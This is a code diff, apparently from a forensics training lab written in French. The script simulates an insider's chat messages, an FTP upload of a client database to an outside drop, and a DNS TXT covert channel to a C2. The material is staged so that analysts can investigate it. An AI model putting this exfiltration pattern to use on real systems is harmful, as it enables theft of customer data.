@@ -58,8 +58,8 @@ def main():
     # --- Reponses dans le chat (P1) ---
     sleep_until(t0, 12)
     chat("Marc", "Point de chute confirme. J'attends le code.")
-    sleep_until(t0, 20)
-    chat("Marc", "Recu. Je transmets au transporteur et j'efface l'historique.")
+    sleep_until(t0, 25)
+    chat("Marc", "Recu les deux morceaux. Je recolle, je decode (ROT13) et je transmets.")
 
     # --- Exfiltration de la base clients par FTP (P2) ---
     sleep_until(t0, 30)
@@ -70,6 +70,11 @@ def main():
     with open(CSV, "rb") as f:
         ftp.storbinary("STOR clients_nordexport.csv", f)
     ftp.quit()
+
+    # Recoupement inter-scelles (defi bonus) : l'effacement annonce ici (scelle
+    # 01, chat HTTP) suit immediatement le STOR FTP ci-dessus (scelle 02).
+    sleep_until(t0, 34)
+    chat("Marc", "Fichier pousse sur le depot darkdrop. J'efface l'historique local.")
 
     # --- Canal cache : requete TXT vers le C2 (P5) ---
     sleep_until(t0, 50)
